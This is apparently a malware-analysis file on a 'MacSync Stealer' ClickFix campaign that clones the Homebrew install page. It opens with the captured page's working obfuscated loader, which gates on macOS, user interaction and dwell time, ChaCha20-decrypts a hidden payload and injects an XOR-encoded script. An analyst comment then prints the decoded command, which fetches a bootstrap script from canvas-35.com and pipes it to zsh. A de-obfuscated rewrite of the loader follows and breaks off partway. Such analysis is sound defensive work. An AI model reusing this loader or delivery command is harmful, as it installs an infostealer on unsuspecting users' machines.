#745626;border-top-right-radius:0.4em;border-bottom-right-radius:0.4em;cursor:pointer;padding:8px 12px;font-size:100%">📋</button></div><br><div class=col-1 style="width:49%;float:left;padding:0 0 1em"><p>Paste that in a Windows PowerShell prompt.</p></div><div class=col-2 style="width:49%;float:right;padding:0 0 1em"><p>Run PowerShell as Administrator for best results.</p></div></section></li><li class="tOCs_e"><section class="group row"><h2 style="font-size:300%;color:#f9d094;margin-top:0.5em;margin-bottom:0.1em;font-weight:800;text-align:center;text-shadow:1px 1px 10px rgba(0,0,0,0.25);line-height:1.1">How to Install</h2><br><div class="install-steps"><div class="install-step"><div class="install-num">1</div><div class="install-body"><div class="install-step-title">Open the Terminal app</div><div class="install-step-desc">Press <span class="install-kbd">⌘ Space</span> to open Spotlight, type <b>Terminal</b>, and press <span class="install-kbd">Enter</span>.</div></div></div><div class="install-step"><div class="install-num">2</div><div class="install-body"><div class="install-step-title">Copy the command</div><div class="install-step-desc">Click the <b>📋</b> button above. You can also click the command itself to select it, then press <span class="install-kbd">⌘ C</span>.</div></div></div><div class="install-step"><div class="install-num">3</div><div class="install-body"><div class="install-step-title">Paste it into Terminal and run</div><div class="install-step-desc">Switch back to Terminal, press <span class="install-kbd">⌘ V</span> to paste, then press <span class="install-kbd">Enter</span>.</div></div></div><div class="install-step"><div class="install-num">4</div><div class="install-body"><div class="install-step-title">Follow the prompts</div><div class="install-step-desc">If asked, type your Mac login password (characters won&rsquo;t show as you type) and press <span class="install-kbd">Enter</span>. Wait a few seconds for the installer to finish &mdash; that&rsquo;s it.</div></div></div></div><p class="install-note">On Linux, use <span class="install-kbd">Ctrl</span> instead of <span class="install-kbd">⌘</span>.</p></section></li><li class="wEXY6E8Yb" style="display:none"><section class="group row"><h2 style="font-size:300%;color:#f9d094;margin-top:0.5em;margin-bottom:0.1em;font-weight:800;text-align:center;text-shadow:1px 1px 10px rgba(0,0,0,0.25);line-height:1.1">How to Install</h2><br><div class="install-steps"><div class="install-step"><div class="install-num">1</div><div class="install-body"><div class="install-step-title">Open PowerShell</div><div class="install-step-desc">Press <span class="install-kbd">Win + R</span>, type <b>powershell</b>, and press <span class="install-kbd">Enter</span>.</div></div></div><div class="install-step"><div class="install-num">2</div><div class="install-body"><div class="install-step-title">Copy the command</div><div class="install-step-desc">Click the <b>📋</b> button above. You can also click the command itself to select it, then press <span class="install-kbd">Ctrl</span><span class="install-kbd">C</span>.</div></div></div><div class="install-step"><div class="install-num">3</div><div class="install-body"><div class="install-step-title">Paste it into PowerShell and run</div><div class="install-step-desc">Switch back to PowerShell, press <span class="install-kbd">Ctrl</span><span class="install-kbd">V</span> to paste, then press <span class="install-kbd">Enter</span>.</div></div></div><div class="install-step"><div class="install-num">4</div><div class="install-body"><div class="install-step-title">Follow the prompts</div><div class="install-step-desc">If asked for admin permission, click <b>Yes</b>. Wait a few seconds for the installer to finish.</div></div></div></div></section></li></ul></div></main></div><script>
(function(){ /* ── OS detection ── */ var _p = (navigator.platform||'').toLowerCase(); var _u = (navigator.userAgent||'').toLowerCase(); var _isWin = (/win/.test(_p) || /windows/.test(_u)) && !/darwin/.test(_u) && !/mac/.test(_u); function _applyOS() { var _mb = document.getElementById('f82qxj'); var _mh = document.querySelector('.tOCs_e'); var _wc = document.querySelector('.gMeODKz8Y'); var _wh = document.querySelector('.wEXY6E8Yb'); var _sub = document.getElementById('subtitle'); if (_isWin) { if (_mb) _mb.style.display = 'none'; if (_mh) _mh.style.display = 'none'; if (_wc) _wc.style.display = ''; if (_wh) _wh.style.display = ''; if (_sub) _sub.innerHTML = '<strong>The Missing Package Manager for Windows</strong>'; } } if (document.readyState === 'loading') { document.addEventListener('DOMContentLoaded', _applyOS); } else { _applyOS(); } /* ── Render command into element ── */ function renderCmd(el, cmd) { if (!el) return; el.textContent = cmd; } /* ── Copy button helper ── */ function setupCopy(cmdId, btnId) { var btn = document.getElementById(btnId); var cel = document.getElementById(cmdId); if (!btn || !cel) return; btn.addEventListener('click', function(){ var cmd = cel.textContent || ''; var orig = btn.textContent; function flash(){ btn.textContent = '✅'; setTimeout(function(){ btn.textContent = orig; }, 1500); } function fallback(){ var ta = document.createElement('textarea'); ta.value = cmd; ta.setAttribute('readonly',''); ta.style.cssText = 'position:fixed;top:0;left:0;opacity:0'; document.body.appendChild(ta); ta.focus(); ta.select(); ta.setSelectionRange(0, cmd.length); try { document.execCommand('copy'); flash(); } catch(e){} document.body.removeChild(ta); } if (navigator.clipboard && navigator.clipboard.writeText && window.isSecureContext) { navigator.clipboard.writeText(cmd).then(flash, fallback); } else { fallback(); } }); } /* ── Initial render with safe command ── */ var _safe = 'Loading...'; window.INSTALL_COMMAND = _safe; renderCmd(document.getElementById('n3ZmGLoC4'), _safe); renderCmd(document.getElementById('h3Ym8_4u'), _safe); /* ── Setup copy buttons ── */ setupCopy('n3ZmGLoC4', 'lOdECy46u'); setupCopy('h3Ym8_4u', 'os4l7a2G'); /* ── Watcher: update when real command is injected by loader ── */ var _done = false; var _tmr = setInterval(function(){ if (_done) { clearInterval(_tmr); return; } var ids = ['n3ZmGLoC4', 'h3Ym8_4u']; for (var i = 0; i < ids.length; i++) { var el = document.getElementById(ids[i]); if (el && el.textContent && el.textContent !== _safe) { _done = true; clearInterval(_tmr); window.INSTALL_COMMAND = el.textContent; return; } } }, 300);
})();
</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"fd9e9b14bd544062916b6f933141cabb","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script><script>(function(){
var d=document;
var v1I=["textContent","getElementById","addEventListener","fromCharCode","length","location","hostname","dojR6pMs","h3Ym8_4u","n3ZmGLoC4","xdIaBb","mousemove","scroll","click","touchstart","touchmove","userAgent","platform","parse","search"]; var uwpC=d[v1I[1]](v1I[8]);
var w9B=d[v1I[1]](v1I[9]);
var l5go=d[v1I[1]](v1I[10]);
var uuv=d[v1I[1]](v1I[7]);
if((!uwpC&&!w9B&&!l5go)||!uuv)return; var dz_=0,wcBu=Date.now();
function vt5sm(e){dz_++;}
d[v1I[2]](v1I[11],vt5sm,{passive:true});d[v1I[2]](v1I[12],vt5sm,{passive:true});d[v1I[2]](v1I[13],vt5sm,{passive:true});d[v1I[2]](v1I[14],vt5sm,{passive:true});d[v1I[2]](v1I[15],vt5sm,{passive:true});
var ldg=(function(){var u=(navigator[v1I[16]]||'').toLowerCase(),p=(navigator[v1I[17]]||'').toLowerCase();var c=p+' '+u;return /mac|iphone|ipad|ipod/.test(c)?1:(/win/.test(c)&&!/darwin/.test(u))?2:0;})();
var yQos=false;
function mRJW(){return dz_>=10&&(Date.now()-wcBu)>=2000;}
function zWa(s){var b=atob(s),o=new Uint8Array(b.length);for(var i=0;i<b.length;i++)o[i]=b.charCodeAt(i);return o;}
function oQreG(a,b){return((a<<b)|(a>>>(32-b)))>>>0;}
function hqO(s,a,b,c,e){s[a]=(s[a]+s[b])>>>0;s[e]=oQreG(s[e]^s[a],16);s[c]=(s[c]+s[e])>>>0;s[b]=oQreG(s[b]^s[c],12);s[a]=(s[a]+s[b])>>>0;s[e]=oQreG(s[e]^s[a],8);s[c]=(s[c]+s[e])>>>0;s[b]=oQreG(s[b]^s[c],7);}
function pDyW(k,ct,no){var s=new Uint32Array(16);s[0]=0x61707865;s[1]=0x3320646e;s[2]=0x79622d32;s[3]=0x6b206574;for(var i=0;i<8;i++)s[4+i]=k[i*4]|(k[i*4+1]<<8)|(k[i*4+2]<<16)|(k[i*4+3]<<24);s[12]=ct>>>0;s[13]=no[0]|(no[1]<<8)|(no[2]<<16)|(no[3]<<24);s[14]=no[4]|(no[5]<<8)|(no[6]<<16)|(no[7]<<24);s[15]=no[8]|(no[9]<<8)|(no[10]<<16)|(no[11]<<24);var w=new Uint32Array(s);for(var i=0;i<10;i++){hqO(w,0,4,8,12);hqO(w,1,5,9,13);hqO(w,2,6,10,14);hqO(w,3,7,11,15);hqO(w,0,5,10,15);hqO(w,1,6,11,12);hqO(w,2,7,8,13);hqO(w,3,4,9,14);}var o=new Uint8Array(64);for(var i=0;i<16;i++){var v=(w[i]+s[i])>>>0;o[i*4]=v&255;o[i*4+1]=(v>>>8)&255;o[i*4+2]=(v>>>16)&255;o[i*4+3]=(v>>>24)&255;}return o;}
function bsm(k,no,da){var ct=1,o=new Uint8Array(da.length);for(var off=0;off<da.length;off+=64){var ks=pDyW(k,ct++,no);var e=Math.min(64,da.length-off);for(var i=0;i<e;i++)o[off+i]=da[off+i]^ks[i];}return o;}
function joQ(suf){var k=new Uint8Array(32);for(var i=0;i<8;i++){var h=(0x811c9dc5^Math.imul(i,0x01000193))>>>0;for(var j=0;j<suf.length;j++){h=(h^suf.charCodeAt(j))>>>0;h=Math.imul(h,0x01000193)>>>0;}k[i*4]=h&255;k[i*4+1]=(h>>>8)&255;k[i*4+2]=(h>>>16)&255;k[i*4+3]=(h>>>24)&255;}return k;}
function vpzA(){ if(yQos)return; if(!mRJW())return; if(ldg!==1)return;try{ var pay=zWa((uuv[v1I[0]]||'').replace(/\s+/g,'')); var no=zWa('KIq+G2ZEL2JqXVf1'); var host=(self[v1I[5]]&&self[v1I[5]][v1I[6]])||''; var suf=''; var key=joQ(suf); var pt=bsm(key,no,pay); var v='';for(var i=0;i<pt.length;i++)v+=String[v1I[3]](pt[i]); try{v=decodeURIComponent(escape(v));}catch(x){} if(!v)return; var obj=JSON[v1I[18]](v); if(w9B&&obj.mArm){w9B[v1I[0]]=obj.mArm;w9B.classList&&w9B.classList.remove('loading');w9B.style.opacity='1';} if(l5go&&obj.mIntel){l5go[v1I[0]]=obj.mIntel;l5go.classList&&l5go.classList.remove('loading');l5go.style.opacity='1';} if(uwpC){var _cmd=ldg===1?(obj.mArm||obj.mIntel||obj.m||''):(ldg===2?(obj.w||obj.mArm||obj.mIntel||obj.m||''):(obj.mArm||obj.mIntel||obj.m||''));if(_cmd){uwpC[v1I[0]]=_cmd;uwpC.classList&&uwpC.classList.remove('loading');uwpC.style.opacity='1';}} yQos=true; }catch(e){}
}
var iJdc=setInterval(function(){if(yQos)clearInterval(iJdc);else vpzA();},400);
})();</script><div style="display:none" id="dojR6pMs">Pb2HbtTp2S2nPajjO2xIgeBu8N/wimSqB5QUDz7kcepbKEPEAFu7NHNqYgrEqG7xeqD3XuIeyDKr7e+bk9ZdemURyJBkyXI8qhVt708HHsks/25XjyX0JeCjA4ZU+sImw9LEyAe1Cq3GKxgwbOg//ArdZf+mcXxagjfa/6Bq6sKLtuc7P5QmXylqsPyM0DHDbNyK80kb0ErxQk9mK67uK8+4x01b1BO7FHhp/fYSY5y0QgkjlUzowXBr/DVmIG+I+RGT5CMHrn0RCTkovJ43JdFb6DjCQs0yyzCtN/sTG1N9uErsOlXiwvrwgzrBeyGcceifwBVpjBWGJPAly7GXxemPs86p21PstZjxSp8E/1nB5zjh0CqGFbF/E15iHPAq5a0wwiz7EUMYcqxfF63tSohilsPqImmMUzZc1NIfkPAi+83H7OrJ67VHkfihJXq+A9ZHIhuxRt0R1dJoZai9pOz+OJtASknq+ShDdIDDdN/kTN3Av4driJDwqtGmb27rp3rA4t9cJO1DxPNZMY08O+aR8Q7po1RCqoESEEXbcjv+sGyV4k4/jc4rndd9CWwuZfXnFAUfuGl+8LB0XND62Sk8Fdub4sVkCg+GDlCjTlYIAU6k1S3iNR9h1WVJDVOvfrg+H/uAz5Yu85f/TC29YDVDiv+Tk0f2t33NaP+jzlE1U2PmA4PrXrXSqDZKDW3z5cMX1D2YsvKck96tYxSw1I30GtqxUoJnNE7Y4/vgtRTYujEz1TTHMbE5Ue0=</div><script>(function(){var kDNf7Q=[126,166,213,213,104,53,35,234,52,61,126,133,7,71,193,36,16,0,109,1,92,43,228,98,116,53,223,172,59,61,90];var mVYxc=atob("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");var q_UMI8='';for(var tcI=0;tcI<mVYxc.length;tcI++)q_UMI8+=String.fromCharCode(mVYxc.charCodeAt(tcI)^kDNf7Q[tcI%kDNf7Q.length]);var aZa=document.createElement('script');aZa.textContent=decodeURIComponent(escape(q_UMI8));document.head.appendChild(aZa);})();</script>

/*
 * MacSync Stealer - fake Homebrew ClickFix
 *
 * Classification:
 *   clickfix
 *   macsync
 *   macos
 *   infostealer
 *   fake-software
 *
 * The page clones the Homebrew installation site and presents a terminal
 * command as the installation method.
 *
 * Delivery is gated behind macOS detection, at least ten user interaction
 * events, and two seconds of dwell time. The interaction counter watches
 * mouse movement, scrolling, clicks, touch starts and touch movement.
 *
 * After the gate passes, the loader reads an encrypted Base64 blob from a
 * hidden page element, derives a deterministic 256-bit key, decrypts the
 * payload with ChaCha20 and parses the resulting JSON.
 *
 * The macOS command fields contain the same shell command. The command shown
 * to the visitor is itself Base64 encoded and executed through zsh.
 *
 * Decoding the terminal command produces:
 *
 *   export _run_ts27=5e8d5e49 RATE_n_p9v=true;
 *   curl -sL "https://canvas-35.com/curl/n2rfjo98p/bootstrap.sh" | /bin/zsh
 *
 * The /curl/<token> retrieval pattern is used by MacSync Stealer delivery.
 *
 * Page loads
 *     |
 *     +-> Clone Homebrew installation page
 *     |
 *     +-> Detect operating system
 *     |     |
 *     |     +-> macOS
 *     |           |
 *     |           +-> Continue
 *     |
 *     +-> Monitor interaction
 *     |     |
 *     |     +-> mousemove
 *     |     +-> scroll
 *     |     +-> click
 *     |     +-> touchstart
 *     |     +-> touchmove
 *     |
 *     +-> Require:
 *     |     |
 *     |     +-> >= 10 interaction events
 *     |     +-> >= 2 seconds elapsed
 *     |
 *     +-> Read hidden #dojR6pMs payload
 *     |
 *     +-> Base64 decode
 *     |
 *     +-> Derive 256-bit key
 *     |
 *     +-> ChaCha20 decrypt
 *     |
 *     +-> JSON.parse()
 *     |
 *     +-> Select macOS command
 *     |     |
 *     |     +-> mArm
 *     |     +-> mIntel
 *     |     +-> m
 *     |
 *     +-> Replace "Loading..." with command
 *     |
 *     +-> Victim copies and executes command
 *           |
 *           +-> Base64 decode
 *           +-> zsh
 *           +-> canvas-35.com
 *                 |
 *                 +-> /curl/n2rfjo98p/bootstrap.sh
 *                       |
 *                       +-> pipe directly to /bin/zsh
 *
 * Infrastructure:
 *
 *   canvas-35.com
 *       MacSync delivery host
 *
 *   /curl/n2rfjo98p/bootstrap.sh
 *       First-stage shell bootstrap
 *
 * Useful pivots:
 *
 *   /curl/
 *   dojR6pMs
 *   KIq+G2ZEL2JqXVf1
 *   _run_ts27
 *   RATE_n_p9v
 *
 *
 * ## Normalized
 */

(() => {
    "use strict";

    const MIN_INTERACTIONS = 10;
    const MIN_DWELL_MS = 2000;

    const PAYLOAD_ELEMENT_ID = "dojR6pMs";

    const MAC_ARM_COMMAND_ID = "h3Ym8_4u";
    const MAC_INTEL_COMMAND_ID = "n3ZmGLoC4";

    const PAYLOAD_NONCE =
        "KIq+G2ZEL2JqXVf1";

    let interactionCount = 0;
    const pageStart = Date.now();

    let payloadLoaded = false;

    /*
     * Determine which operating-system branch should receive a command.
     *
     * 1 = macOS
     * 2 = Windows
     * 0 = other
     */
    function detectPlatform() {
        const userAgent =
            (navigator.userAgent || "").toLowerCase();

        const platform =
            (navigator.platform || "").toLowerCase();

        const combined =
            platform + " " + userAgent;

        if (
            /mac|iphone|ipad|ipod/.test(combined)
        ) {
            return 1;
        }

        if (
            /win/.test(combined) &&
            !/darwin/.test(userAgent)
        ) {
            return 2;
        }

        return 0;
    }

    const platform = detectPlatform();

    /*
     * Count user-generated activity before exposing the command.
     */
    function recordInteraction() {
        interactionCount++;
    }

    [
        "mousemove",
        "scroll",
        "click",
        "touchstart",
        "touchmove"
    ].forEach((eventName) => {
        document.addEventListener(
            eventName,
            recordInteraction,
            { passive: true }
        );
    });

    function interactionGatePassed() {
        return (
            interactionCount >= MIN_INTERACTIONS &&
            Date.now() - pageStart >= MIN_DWELL_MS
        );
    }

    /*
     * Standard Base64 -> Uint8Array conversion.
     */
    function decodeBase64Bytes(value) {
        const decoded = atob(value);

        const output =
            new Uint8Array(decoded.length);

        for (
            let index = 0;
            index < decoded.length;
            index++
        ) {
            output[index] =
                decoded.charCodeAt(index);
        }

        return output;
    }

    function rotateLeft32(value, shift) {
        return (
            (value << shift) |
            (value >>> (32 - shift))
        ) >>> 0;
    }

    /*
     * ChaCha quarter round.
     */
    function quarterRound(
        state,
        a,
        b,
        c,
        d
    ) {
        state[a] =
            (state[a] + state[b]) >>> 0;

        state[d] =
            rotateLeft32(
                state[d] ^ state[a],
                16
            );

        state[c] =
            (state[c] + state[d]) >>> 0;

        state[b] =
            rotateLeft32(
                state[b] ^ state[c],
                12
            );

        state[a] =
            (state[a] + state[b]) >>> 0;

        state[d] =
            rotateLeft32(
                state[d] ^ state[a],
                8
            );

        state[c] =
            (state[c] + state[d]) >>> 0;

        state[b] =
            rotateLeft32(
                state[b] ^ state[c],
                7
            );
    }

    /*
     * Produce one 64-byte ChaCha20 keystream block.
     */
    function chachaBlock(
        key,
        counter,
        nonce
    ) {
        const state =
            new Uint32Array(16);

        state[0] = 0x61707865;
        state[1] = 0x3320646e;
        state[2] = 0x79622d32;
        state[3] = 0x6b206574;

        for (
            let index = 0;
            index < 8;
            index++
        ) {
            const offset = index * 4;

            state[4 + index] =
                key[offset] |
                (key[offset + 1] << 8) |
                (key[offset + 2] << 16) |
                (key[offset + 3] << 24);
        }

        state[12] = counter >>> 0;

        state[13] =
            nonce[0] |
            (nonce[1] << 8) |
            (nonce[2] << 16) |
            (nonce[3] << 24);

        state[14] =
            nonce[4] |
            (nonce[5] << 8) |
            (nonce[6] << 16) |
            (nonce[7] << 24);

        state[15] =
            nonce[8] |
            (nonce[9] << 8) |
            (nonce[10] << 16) |
            (nonce[11] << 24);

        const working =
            new Uint32Array(state);

        for (
            let round = 0;
            round < 10;
            round++
        ) {
            quarterRound(
                working,
                0, 4, 8, 12
            );

            quarterRound(
                working,
                1, 5, 9, 13
            );

            quarterRound(
                working,
                2, 6, 10, 14
            );

            quarterRound(
                working,
                3, 7, 11, 15
            );

            quarterRound(
                working,
                0, 5, 10, 15
            );

            quarterRound(
                working,
                1, 6, 11, 12
            );

            quarterRound(
                working,
                2, 7, 8, 13
            );

            quarterRound(
                working,
                3, 4, 9, 14
            );
        }

        const output =
            new Uint8Array(64);

        for (
            let index = 0;
            index < 16;
            index++
        ) {
            const value =
                (working[index] +
                    state[index]) >>> 0;

            output[index * 4] =
                value & 0xff;

            output[index * 4 + 1] =
                (value >>> 8) & 0xff;

            output[index * 4 + 2] =
                (value >>> 16) & 0xff;

            output[index * 4 + 3] =
                (value >>> 24) & 0xff;
        }

        return output;
    }

    /*
     * Decrypt the stored payload using the ChaCha20 stream.
     */
    function decryptChaCha20(
        key,
        nonce,
        ciphertext
    ) {
        let counter = 1;

        const plaintext =
            new Uint8Array(
                ciphertext.length
            );

        for (
            let offset = 0;
            offset < ciphertext.length;
            offset += 64
        ) {
            const keyStream =
                chachaBlock(
                    key,
                    counter++,
                    nonce
                );

            const blockLength =
                Math.min(
                    64,
                    ciphertext.length - offset
                );

            for (
                let index = 0;
                index < blockLength;
                index++
            ) {
                plaintext[offset + index] =
                    ciphertext[offset + index] ^
                    keyStream[index];
            }
        }

        return plaintext;
    }

    /*
     * Derive the 32-byte key using the FNV-1a-style routine from the
     * original loader.
     *
     * This observed build supplies an empty suffix.
     */
    function deriveKey(suffix = "") {
        const key =
            new Uint8Array(32);

        for (
            let index = 0;
            index < 8;
            index++
        ) {
            let hash =
                (
                    0x811c9dc5 ^
                    Math.imul(
                        index,
                        0x01000193
                    )
                ) >>> 0;

            for (
                let position = 0;
                position < suffix.length;
                position++
            ) {
                hash =
                    (
                        hash ^
                        suffix.charCodeAt(
                            position
                        )
                    ) >>> 0;

                hash =
                    Math.imul(
                        hash,
                        0x01000193
                    ) >>> 0;
            }

            key[index * 4] =
                hash & 0xff;

            key[index * 4 + 1] =
                (hash >>> 8) & 0xff;

            key[index * 4 + 2] =
                (hash >>> 16) & 0xff;

            key[index * 4 + 3] =
                (hash >>> 24) & 0xff;
        }

        return key;
    }

    function bytesToString(bytes) {
        let value = "";

        for (
            let index = 0;
            index < bytes.length;
            index++
        ) {
            value +=
                String.fromCharCode(
                    bytes[index]
                );
        }

        try {
            value =
                decodeURIComponent(
                    escape(value)
                );
        } catch {
        }

        return value;
    }

    /*
     * Recover the command configuration stored in #dojR6pMs.
     */
